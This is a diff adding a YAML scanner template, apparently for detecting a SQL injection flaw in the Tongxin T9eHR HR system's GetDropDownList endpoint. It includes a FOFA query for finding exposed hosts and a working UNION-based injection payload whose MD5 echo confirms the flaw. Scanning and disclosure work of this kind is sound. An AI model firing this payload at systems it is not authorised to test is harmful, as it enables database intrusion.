@@ -1,0 +1,22 @@
+id: poc-yaml-tongxine-t9ehr-getdropdownlist-sqli
+info:
+  name: 同鑫T9eHR信息化管理系统 GetDropDownList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 同鑫T9eHR信息化管理系统
+  fofa: body="T9eHR"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Common/GetDropDownList
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+  data: DataSource=1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')),0x7e),NULL,NULL,NULL,NULL,NULL,NULL--
+    SWgM&Items=1&defaultVal=1
+  expression: "status_code == 200 && \ncontains(body,\"0x\" + t2) &&\ncontains(body,\"\
+    \\\"success\\\":true\") &&\ncontains(body,\"Key\") &&\ncontains(content_type,\"\
+    application/json\")\n"
+transport: http
